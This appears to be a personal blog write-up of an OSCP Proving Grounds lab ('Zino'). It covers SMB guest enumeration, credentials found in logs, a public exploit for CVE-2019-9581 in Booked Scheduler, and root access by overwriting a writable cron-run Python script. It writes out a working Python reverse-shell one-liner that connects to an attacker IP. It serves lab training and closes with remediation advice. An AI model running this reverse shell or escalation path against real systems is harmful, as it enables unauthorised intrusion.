---
title: 'Zino &#8211; Proving Grounds #1'
date: '2023-11-28T00:55:24+00:00'
status: publish
permalink: /2023/11/28/zino
author: William
excerpt: ''
type: post
id: 454
category:
    - 'Penetration Testing'
tag:
    - Tech
post_format: []
site-sidebar-layout:
    - default
ast-site-content-layout:
    - default
site-content-style:
    - default
site-sidebar-style:
    - default
theme-transparent-header-meta:
    - default
_yoast_wpseo_content_score:
    - '30'
_yoast_wpseo_primary_category:
    - '11'
astra-migrate-meta-layouts:
    - set
---
This was my first proving grounds lab of my OSCP. Took longer than I would have liked but I was able to pwn it in the end with a joyful fist pump and woop from my side. Any advice or comments on how I could improve this write-up would be appreciated.

#### Executive summary

The attacker was able to achieve privileged remote code execution on the target box. Issues found can be easily remediated by updating the software Booked Scheduler to V3.7.9 and restricting write permissions of a scheduled cron job.

#### Technical Findings

These are the steps I took to achieve privileged remote code execution in this lab.

Starting with a high-level scan of our target.  
![](https://i0.wp.com/i.imgur.com/PzhTifh.png?resize=704%2C357&ssl=1)

<span id="speechify-first-word-listening-nudge-root-12" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-12"><span id="speechify-first-word-listening-nudge-root-12" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-12">Of these lets</span></span> take a closer look at the smb ports  
![](https://i0.wp.com/i.imgur.com/YU0ToTg.png?resize=760%2C532&ssl=1)We see that guest is enabled on port 445. This combined with a quick enumeration of the shares using <span style="text-decoration: underline;">smbmap</span> we can log into our target using smbclient.  
![](https://i0.wp.com/i.imgur.com/V1QmpMi.png?resize=609%2C279&ssl=1)

Here we find our first flag **local.txt** along with a bunch of log files.

<span id="speechify-first-word-listening-nudge-root-12" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-12">50% DONE!!!</span>

Of these auth.log and misc.log have some interesting contents  
![](https://i0.wp.com/i.imgur.com/oEsCkHH.png?resize=903%2C84&ssl=1)

![](https://i0.wp.com/i.imgur.com/uKg3ptK.png?resize=720%2C122&ssl=1)Of these two misc.log is the most interesting as it has admin credentials in it. Ill be using this going forward.

<span id="speechify-first-word-listening-nudge-root-17" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-17"><span id="speechify-first-word-listening-nudge-root-17" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-17">With our initial</span></span> Nmap scan we found a webserver hosted on port 8003. On closer inspection we find a login portal with the version of the hosting software listed at the bottom. After a quick lookup of this software we find the following.  
![](https://i0.wp.com/i.imgur.com/cVRcvtR.png?resize=836%2C127&ssl=1)

Ill be using the seccond entry (50594.py) to exploit our target. This exploits the vulnerability CVE-2019-9581.  
![](https://i0.wp.com/i.imgur.com/zkWQAXl.png?resize=586%2C111&ssl=1)With remote code execution on our host we can now leverage this into a reverse shell using a generic Python reverse shell script.

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.215",21));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")’
```

![](https://i0.wp.com/i.imgur.com/iMu1dUe.png?resize=572%2C105&ssl=1)

<span id="speechify-first-word-listening-nudge-root-20" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-20"><span id="speechify-first-word-listening-nudge-root-20" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-20">SUCCESS. Now with</span></span> the reverse shell I can start looking around for what we have access to… To save you the headache I’ll fast track to the fun part. I find an interesting entry in the cron jobs folder.  
![](https://i0.wp.com/i.imgur.com/MGoJlKn.png?resize=807%2C384&ssl=1)There right at the bottom, there is a Python script run by the cron job with root privileges. Looking at the file in question confirms that we are able to edit it.  
![](https://i0.wp.com/i.imgur.com/hwPItPu.png?resize=705%2C38&ssl=1)

We write a Python script locally that will execute the generic reverse shell Python script we used earlier, but now because it will be executed in the root context we will get a root shell.

<span id="speechify-first-word-listening-nudge-root-20" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-20">So we write</span> the script and host it on our local HTTP server.  
![](https://i0.wp.com/i.imgur.com/REwW9wj.png?resize=680%2C180&ssl=1)Fetch that puppy overwriting the cleanup.py file! And now we wait with a netcat listener.  
After a minute and a quick coffee break we come back to this beautiful sight  
![](https://i0.wp.com/i.imgur.com/GJSys1g.png?resize=633%2C117&ssl=1)SUCCESS!!!!!

<span id="speechify-first-word-listening-nudge-root-23" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-23"><span id="speechify-first-word-listening-nudge-root-23" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-23">The flag can</span></span> be found at **cat /root/proof.txt**

Something to note is that you will run into issues if you try to use any ports other than those opened. It seems for this lab they closed all unnecessary ports in line with industry best practice.


#### Conclusion

<span id="speechify-first-word-listening-nudge-root-23" style="position: absolute; z-index: 10000;"></span><span id="speechify-first-word-listening-nudge-23">How to fix</span> this is quite simple. Here are 3 action times:

1. Update Booked Scheduler to 3.7.9 to prevent the initial foothold
2. Restrict write permissions on <span style="text-decoration: underline;">cleanup.py</span>
3. Ensure no user credentials are logged. And probably reroll admin and peter, using a more secure password this time ;D

All in all, this was a fun lab to start cutting my teeth on, don’t worry this is the first of many!